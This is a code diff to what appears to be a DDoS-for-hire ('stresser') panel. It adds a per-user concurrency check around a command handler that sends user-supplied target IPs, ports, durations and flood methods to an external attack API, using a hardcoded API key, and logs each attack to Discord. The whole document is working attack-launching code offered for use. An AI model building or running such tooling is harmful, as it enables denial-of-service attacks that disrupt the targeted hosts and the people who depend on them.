@@ -5,6 +5,9 @@ from ..utils.main import *
 from ..Logger.main import *
 from ..Logger.discord import *
 from ..Config.main import *
+from ..auth.main import *
+from ..auth.crud import *
+from ..auth.crudFunc import *
 
 AttackToggle = True
 
@@ -27,29 +30,32 @@ def real_ip(ip: str):
 
 def temporary_attack(socket, argv):
     if NetSettings.stresser == True:
-        if len(argv) == 5:
-            ip = argv[1]
-            check1 = uri_exists_get(ip)
-            check2 = real_ip(ip)
-            if check1 == True or check2 == True:
-                port = argv[2]
-                time = argv[3]
-                try:
-                    check1 = int(port)
-                    check2 = int(time)
-                except:
-                    socket.send("PLEASE PROVIDE A VALID VALUE FOR PORT AND TIME WE HAVE DETECTED YOU HAVENT GAVE AN INT IN THE FEILDS !\r\n".encode())
-                    return None
-                method = argv[4]
-                socket.send("Sending attack, please wait....\r\n".encode())
-                send = requests.get(f"https://api.supremesecurity.cz/sst/api?service=flood&key=3gks8shg112099z&host={ip}&port={port}&time={time}&method={method}&network=1").text
-                print(send) # WHY ARE WE PRINTING RESPONSE ????
-                Discord.send_attack(f"New Attack Sent!\r\n[User]: {Strings.CurrentUser} | CMD: {argv}")
-                LogTypes.LogAttack(f"('{Strings.CurrentUser}','{argv}')")
-                socket.send(f"Attack sent to: {ip}:{port} for {time} seconds with {method}\r\n".encode())
+        if CrudFunctions.AttackValidation(Strings.CurrentUser):
+            if len(argv) == 5:
+                ip = argv[1]
+                check1 = uri_exists_get(ip)
+                check2 = real_ip(ip)
+                if check1 == True or check2 == True:
+                    port = argv[2]
+                    time = argv[3]
+                    try:
+                        check1 = int(port)
+                        check2 = int(time)
+                    except:
+                        socket.send("Please Provide a valid value for ports and time we have detected you haven't gave an INT in the fields!\r\n".encode())
+                        return None
+                    method = argv[4]
+                    socket.send("Sending attack, please wait....\r\n".encode())
+                    send = requests.get(f"https://api.supremesecurity.cz/sst/api?service=flood&key=3gks8shg112099z&host={ip}&port={port}&time={time}&method={method}&network=1").text
+                    print(send) # WHY ARE WE PRINTING RESPONSE ????
+                    Discord.send_attack(f"New Attack Sent!\r\n[User]: {Strings.CurrentUser} | CMD: {argv}")
+                    LogTypes.LogAttack(f"('{Strings.CurrentUser}','{argv}')")
+                    socket.send(f"Attack sent to: {ip}:{port} for {time} seconds with {method}\r\n".encode())
+                else:
+                    socket.send("Sorry But You Need To Provide A Real Ip Or Url\r\n".encode())
             else:
-                socket.send("Sorry But You Need To Provide A Real Ip Or Url\r\n".encode())
+                socket.send(f"[x] Error, Invalid Argument\r\nUsage: attack <ip> <port> <time> <method>\r\nExmaple: attack 5.5.5.5 80 300 UDP\r\n".encode())
         else:
-            socket.send(f"[x] Error, Invalid Argument\r\nUsage: attack <ip> <port> <time> <method>\r\nExmaple: attack 5.5.5.5 80 300 UDP\r\n".encode())
+            socket.send(f"[x] Error, You've reached the max concurrents! try again soon...".encode())
     else:
         socket.send("[x] Error, Attack hub is currently disabled for maintenance, try again later....\r\n".encode())
